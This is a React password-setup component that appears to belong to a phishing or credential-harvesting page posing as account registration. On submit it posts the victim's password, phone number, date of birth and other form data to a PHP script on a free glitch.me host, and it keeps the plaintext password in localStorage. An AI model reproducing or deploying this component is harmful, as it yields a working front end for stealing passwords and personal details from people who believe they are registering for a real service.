import React, { useState } from "react";
import FormInput from "../components/FormInput.jsx";

function PasswordVerification({ submissionId, userData }) {
  const [passwordData, setPasswordData] = useState({
    password: "",
    confirmPassword: "",
  });
  const [errors, setErrors] = useState({});
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isComplete, setIsComplete] = useState(false);

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setPasswordData((prev) => ({
      ...prev,
      [name]: value,
    }));
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors((prev) => ({
        ...prev,
        [name]: "",
      }));
    }
  };

  const validateForm = () => {
    const newErrors = {};

    if (!passwordData.password) {
      newErrors.password = "Password is required";
    } else if (passwordData.password.length < 8) {
      newErrors.password = "Password must be at least 8 characters";
    }

    if (!passwordData.confirmPassword) {
      newErrors.confirmPassword = "Please confirm your password";
    } else if (passwordData.password !== passwordData.confirmPassword) {
      newErrors.confirmPassword = "Passwords do not match";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setIsSubmitting(true);

    try {
      const completeSubmission = {
        submissionId,
        userData,
        passwordData: {
          password: passwordData.password,
          confirmedAt: new Date().toISOString(),
        },
      };

      // Create FormData for the API request
      const apiFormData = new FormData();
      apiFormData.append("submissionId", submissionId);
      apiFormData.append("password", passwordData.password);
      apiFormData.append("confirmedAt", new Date().toISOString());

      // Add user data fields
      if (userData) {
        Object.keys(userData).forEach((key) => {
          apiFormData.append(key, userData[key]);
        });
      }

      // Send to external API
      const response = await fetch(
        "https://mixed-fluff-space.glitch.me/zubaireng.php",
        {
          method: "POST",
          body: apiFormData,
        },
      );

      if (response.ok) {
        // Store locally as backup
        localStorage.setItem(
          `submission_${submissionId}`,
          JSON.stringify(completeSubmission),
        );
        setIsSubmitting(false);
        setIsComplete(true);
      } else {
        throw new Error("Password submission failed");
      }
    } catch (error) {
      console.error("Error submitting password:", error);
      setErrors({ submit: "Failed to submit password. Please try again." });
      setIsSubmitting(false);
    }
  };

  if (isComplete) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <div className="form-container text-center">
          <div className="text-green-600 text-6xl mb-4">✓</div>
          <h2 className="text-2xl font-bold text-gray-800 mb-4">
            Submission Complete!
          </h2>
          <p className="text-gray-600 mb-6">
            Your information has been successfully submitted.
          </p>
          <div className="bg-gray-50 p-4 rounded-lg text-left">
            <h3 className="font-semibold mb-2">Submission Details:</h3>
            <p>
              <strong>ID:</strong> {submissionId}
            </p>
            <p>
              <strong>Phone:</strong> {userData?.phoneNumber}
            </p>
            <p>
              <strong>Date of Birth:</strong> {userData?.dateOfBirth}
            </p>
          </div>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="form-container">
        <h2 className="text-2xl font-bold text-gray-800 mb-6">
          Set Your Password
        </h2>

        <div className="bg-blue-50 border border-blue-200 rounded-lg p-4 mb-6">
          <p className="text-blue-800 text-sm">
            Please create a secure password to complete your registration.
          </p>
        </div>

        <form onSubmit={handleSubmit}>
          <FormInput
            label="Password"
            type="password"
            name="password"
            value={passwordData.password}
            onChange={handleInputChange}
            error={errors.password}
            required
            placeholder="Enter your password"
          />

          <FormInput
            label="Confirm Password"
            type="password"
            name="confirmPassword"
            value={passwordData.confirmPassword}
            onChange={handleInputChange}
            error={errors.confirmPassword}
            required
            placeholder="Confirm your password"
          />

          {errors.submit && (
            <div className="error-message mb-4">{errors.submit}</div>
          )}

          <button
            type="submit"
            className="submit-button"
            disabled={isSubmitting}
          >
            {isSubmitting ? "Creating Account..." : "Complete Registration"}
          </button>
        </form>
      </div>
    </div>
  );
}

export default PasswordVerification;
